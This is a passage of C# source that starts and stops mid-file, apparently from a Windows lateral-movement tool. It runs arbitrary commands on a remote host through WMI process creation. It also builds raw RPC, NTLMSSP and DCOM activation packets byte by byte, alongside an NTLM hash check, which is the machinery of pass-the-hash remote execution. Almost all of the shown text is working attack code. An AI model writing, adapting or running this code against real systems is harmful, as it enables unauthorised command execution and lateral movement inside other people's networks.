                                    }
                                    Thread.Sleep(10);
                                }
                                randomPortStream.Close();
                                randomPortClient.Close();
                            }
                            client.Close();
                            stream.Close();
                        }
                    }
                }
                else
                {
                    ConnectionOptions connOptions = new ConnectionOptions();

                    if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(user))
                    {
                        connOptions.Username = user;
                        connOptions.Password = pass;
                    }
                    else
                    {
                        connOptions.Impersonation = ImpersonationLevel.Impersonate;
                        connOptions.EnablePrivileges = true;
                    }

                    ManagementScope manScope = new ManagementScope(String.Format(@"\\{0}\ROOT\CIMV2", rhost), connOptions);
                    manScope.Connect();

                    Console.WriteLine("Connected: {0}", manScope.IsConnected);

                    ObjectGetOptions objectGetOptions = new ObjectGetOptions();
                    ManagementPath managementPath = new ManagementPath("Win32_Process");

                    ManagementClass processClass = new ManagementClass(manScope, managementPath, objectGetOptions).Derive("Win32_Present");
                    processClass.Put();

                    ManagementBaseObject inParams = processClass.GetMethodParameters("Create");
                    inParams["CommandLine"] = cmd;
                    ManagementBaseObject outParams = processClass.InvokeMethod("Create", inParams, null);

                    if (string.Equals(outParams["returnValue"].ToString(), "0"))
                        Console.WriteLine("\nSuccess!");
                    else
                        Console.WriteLine("\nEpic Fail -- Return Value: {0}", outParams["returnValue"]);
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                Console.WriteLine("Stack Trace: {0}", ex.StackTrace);
            }
        }

        private static bool IsNTLM(string hash)
        {
            return Regex.IsMatch(hash, "^[a-zA-Z0-9]{32}$");
        }

        private static byte[] AppendBytes(byte[] current, byte[] append)
        {
            List<byte> outBytes = new List<byte>();
            outBytes.AddRange(current);
            outBytes.AddRange(append);

            return outBytes.ToArray();
        }

        private static List<KeyValuePair<string, byte[]>> PacketRPCBind(int callId, byte[] maxFrag, byte[] numCtxItems, byte[] contextId, byte[] uuid, byte[] uuidVersion)
        {
            List<KeyValuePair<string, byte[]>> rpcBind = new List<KeyValuePair<string, byte[]>>() { };

            byte[] callIdBytes = BitConverter.GetBytes(callId);

            rpcBind.Add(new KeyValuePair<string, byte[]> ( "Version", new byte[] { 0x05 } ));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "VersionMinor", new byte[] {0x00}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "PacketType",new byte[] {0x0b}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "PacketFlags",new byte[] {0x03}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "DataRepresentation", new byte[] {0x10, 0x00, 0x00, 0x00}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "FragLength", new byte[] {0x48, 0x00}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "AuthLength", new byte[] {0x00, 0x00}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "CallID", callIdBytes));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "MaxXmitFrag", new byte[] {0xb8, 0x10}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "MaxRecvFrag", new byte[] {0xb8, 0x10}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "AssocGroup", new byte[] {0x00, 0x00, 0x00, 0x00}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "NumCtxItems",numCtxItems));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "Unknown", new byte[] {0x00, 0x00, 0x00}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "ContextID", contextId));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "NumTransItems", new byte[] {0x01}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "Unknown2", new byte[] {0x00}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "Interface", uuid));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "InterfaceVer", uuidVersion));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "InterfaceVerMinor", new byte[] {0x00, 0x00}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "TransferSyntax", new byte[] {0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}));
            rpcBind.Add(new KeyValuePair<string, byte[]>( "TransferSyntaxVer", new byte[] {0x02, 0x00, 0x00, 0x00}));

            if (numCtxItems[0] == 2)
            {
                rpcBind.Add(new KeyValuePair<string, byte[]>( "ContextID2",new byte[] {0x01, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "NumTransItems2",new byte[] {0x01}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "Unknown3",new byte[] {0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "Interface2",new byte[] {0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "InterfaceVer2",new byte[] {0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "InterfaceVerMinor2",new byte[] {0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "TransferSyntax2",new byte[] {0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "TransferSyntaxVer2",new byte[] {0x01, 0x00, 0x00, 0x00}));
            }
            else if(numCtxItems[0] == 3)
            {
                rpcBind.Add(new KeyValuePair<string, byte[]>( "ContextID2",new byte[] {0x01, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "NumTransItems2",new byte[] {0x01}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "Unknown3",new byte[] {0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "Interface2",new byte[] {0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "InterfaceVer2",new byte[] {0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "InterfaceVerMinor2",new byte[] {0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "TransferSyntax2",new byte[] {0x33, 0x05, 0x71, 0x71, 0xba, 0xbe, 0x37, 0x49, 0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "TransferSyntaxVer2",new byte[] {0x01, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "ContextID3",new byte[] {0x02, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "NumTransItems3",new byte[] {0x01}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "Unknown4",new byte[] {0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "Interface3",new byte[] {0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "InterfaceVer3",new byte[] {0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "InterfaceVerMinor3",new byte[] {0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "TransferSyntax3",new byte[] {0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "TransferSyntaxVer3",new byte[] {0x01, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "AuthType",new byte[] {0x0a}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "AuthLevel",new byte[] {0x04}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "AuthPadLength",new byte[] {0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "AuthReserved",new byte[] {0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "ContextID4",new byte[] {0x00, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "Identifier",new byte[] {0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "MessageType",new byte[] {0x01, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "NegotiateFlags",new byte[] {0x97, 0x82, 0x08, 0xe2}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "CallingWorkstationDomain",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "CallingWorkstationName",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "OSVersion",new byte[] {0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f}));
            }

            if (callId == 3)
            {
                rpcBind.Add(new KeyValuePair<string, byte[]>( "AuthType",new byte[] {0x0a}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "AuthLevel",new byte[] {0x02}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "AuthPadLength",new byte[] {0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "AuthReserved",new byte[] {0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "ContextID3",new byte[] {0x00, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "Identifier",new byte[] {0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "MessageType",new byte[] {0x01, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "NegotiateFlags",new byte[] {0x97, 0x82, 0x08, 0xe2}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "CallingWorkstationDomain",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "CallingWorkstationName",new byte[] {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}));
                rpcBind.Add(new KeyValuePair<string, byte[]>( "OSVersion",new byte[] {0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f}));
            }

            return rpcBind;
        }

        private static List<KeyValuePair<string, byte[]>> PacketNTLMSSPVerifier(int authPadding, byte[] authLevel, byte[] sequenceNum)
        {
            List<KeyValuePair<string, byte[]>> ntlmSspVerifier = new List<KeyValuePair<string, byte[]>>();
            List<byte> authPadLength = new List<byte>(); 

            if (authPadding == 4)
            {
                ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("AuthPadding", new byte[] { 0x00, 0x00, 0x00, 0x00 }));
                authPadLength.Add(0x04);
            }
            else if (authPadding == 8)
            {
                ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("AuthPadding", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }));
                authPadLength.Add(0x08);
            }
            else if (authPadding == 12)
            {
                ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("AuthPadding", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }));
                authPadLength.Add(0x0c);
            }
            else
                authPadLength.Add(0x00);

            ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("AuthType", new byte[] { 0x0a }));
            ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("AuthLevel", authLevel));
            ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("AuthPadLen", authPadLength.ToArray()));
            ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("AuthReserved", new byte[] { 0x00 }));
            ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("AuthContextID", new byte[] { 0x00, 0x00, 0x00, 0x00 }));
            ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("NTLMSSPVerifierVersionNumber", new byte[]{ 0x01, 0x00, 0x00, 0x00}));
            ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("NTLMSSPVerifierChecksum", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }));
            ntlmSspVerifier.Add(new KeyValuePair<string, byte[]>("NTLMSSPVerifierSequenceNumber", sequenceNum));

            return ntlmSspVerifier;
        }

        private static List<KeyValuePair<string, byte[]>> PacketRPCRequest(byte[] flags, int serviceLength, int pAuthLength, int authPadding, byte[] callId, byte[] contextId, byte[] opnum, byte[] data)
        {
            int fullAuthLength = 0;
            if (pAuthLength > 0)
                fullAuthLength = pAuthLength + authPadding + 8;

            byte[] writeLength = BitConverter.GetBytes(serviceLength + 24 + fullAuthLength + data.Length);
            byte[] fragLength = writeLength.SubArray(0,2);
            byte[] allocHint = BitConverter.GetBytes(serviceLength + data.Length);
            byte[] authLength = BitConverter.GetBytes(pAuthLength).SubArray(0,2);

            List<KeyValuePair<string, byte[]>> rpcRequest = new List<KeyValuePair<string, byte[]>>();
            rpcRequest.Add(new KeyValuePair<string, byte[]> ("Version", new byte[] {0x05}));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("VersionMinor", new byte[]{0x00}));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("PacketType", new byte[]{0x00}));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("PacketFlags", flags));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("DataRepresentation", new byte[] { 0x10, 0x00, 0x00, 0x00 }));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("FragLength", fragLength));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("AuthLength", authLength));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("CallID", callId));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("AllocHint", allocHint));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("ContextID", contextId));
            rpcRequest.Add(new KeyValuePair<string, byte[]>("Opnum", opnum));

            if(data.Length != 0)
                rpcRequest.Add(new KeyValuePair<string, byte[]>("Data",data));

            return rpcRequest;
        }

        private static List<KeyValuePair<string,byte[]>> PacketRPCAuth3(byte[] ntlmSsp)
        {

            byte[] ntlmSspLength = BitConverter.GetBytes(ntlmSsp.Length).SubArray(0, 2);
            byte[] rpcLength = BitConverter.GetBytes(ntlmSsp.Length + 28).SubArray(0, 2);

            List<KeyValuePair<string, byte[]>> rpcAuth3 = new List<KeyValuePair<string, byte[]>>();
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("Version", new byte[] {0x05}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("VersionMinor",new byte[] {0x00}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("PacketType",new byte[] {0x10}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("PacketFlags",new byte[] {0x03}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("DataRepresentation",new byte[] {0x10, 0x00, 0x00, 0x00}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("FragLength", rpcLength));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("AuthLength", ntlmSspLength));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("CallID",new byte[] {0x03, 0x00, 0x00, 0x00}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("MaxXmitFrag",new byte[] {0xd0, 0x16}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("MaxRecvFrag",new byte[] {0xd0, 0x16}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("AuthType",new byte[] {0x0a}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("AuthLevel",new byte[] {0x02}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("AuthPadLength",new byte[] {0x00}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("AuthReserved",new byte[] {0x00}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("ContextID",new byte[] {0x00, 0x00, 0x00, 0x00}));
            rpcAuth3.Add(new KeyValuePair<string, byte[]>("NTLMSSP", ntlmSsp));

            return rpcAuth3;
        }

        private static List<KeyValuePair<string, byte[]>> PacketDCOMRemoteCreateInstance(byte[] causalityId, string target)
        {
            List<byte> targetUnicodeList = new List<byte>();
            byte[] targetUnicode = Encoding.Unicode.GetBytes(target);
            targetUnicodeList.AddRange(targetUnicode);
            byte[] targetLength = BitConverter.GetBytes(target.Length + 1);
            for (int i = 1; i <= ((Math.Truncate((double)(targetUnicode.Length / 8 + 1) * 8)) - targetUnicode.Length); i++)
                targetUnicodeList.Add(0x00);
            targetUnicode = targetUnicodeList.ToArray();
            byte[] cntdata = BitConverter.GetBytes(targetUnicode.Length + 720);
            byte[] size = BitConverter.GetBytes(targetUnicode.Length + 680);
            byte[] totalSize = BitConverter.GetBytes(targetUnicode.Length + 664);
            List<byte> privateHeader = new List<byte>() { };
            privateHeader.AddRange(BitConverter.GetBytes(targetUnicode.Length + 40));
            privateHeader.AddRange(new List<byte>() { 0x00, 0x00, 0x00, 0x00 });
            byte[] propertyDataSize = BitConverter.GetBytes(targetUnicode.Length + 56);

            List<KeyValuePair<string, byte[]>> dcomRemoteCreateInstance = new List<KeyValuePair<string, byte[]>>();
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("DCOMVersionMajor", new byte[] {0x05,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("DCOMVersionMinor",new byte[] {0x07,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("DCOMFlags",new byte[] {0x01,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("DCOMReserved",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("DCOMCausalityID",causalityId));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("Unknown",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("Unknown2",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("Unknown3",new byte[] {0x00,0x00,0x02,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("Unknown4",cntdata));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCntData",cntdata));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesOBJREFSignature",new byte[] {0x4d,0x45,0x4f,0x57}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesOBJREFFlags",new byte[] {0x04,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesOBJREFIID",new byte[] {0xa2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFCLSID",new byte[] {0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFCBExtension",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFSize",size));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize",totalSize));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesReserved",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader",new byte[] {0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader",new byte[] {0xb0,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize",totalSize));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize",new byte[] {0xc0,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext",new byte[] {0x02,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs",new byte[] {0x06,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID",new byte[] {0x00,0x00,0x02,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID",new byte[] {0x04,0x00,0x02,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount",new byte[] {0x06,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid",new byte[] {0xb9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2",new byte[] {0xab,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3",new byte[] {0xa5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4",new byte[] {0xa6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5",new byte[] {0xa4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6",new byte[] {0xaa,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount",new byte[] {0x06,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize",new byte[] {0x68,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2",new byte[] {0x58,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3",new byte[] {0x90,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4",propertyDataSize));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5",new byte[] {0x20,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6",new byte[] {0x30,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader",new byte[] {0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader",new byte[] {0x58,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID",new byte[] {0xff,0xff,0xff,0xff}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel",new byte[] {0x02,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags",new byte[] {0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext",new byte[] {0x14,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags",new byte[] {0x02,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer",new byte[] {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader",new byte[] {0x01,0x10,0x08,0x00,0xcc,0xcc,0xcc,0xcc}));
            dcomRemoteCreateInstance.Add(new KeyValuePair<string, byte[]>("IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader",new byte[] {0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00}));
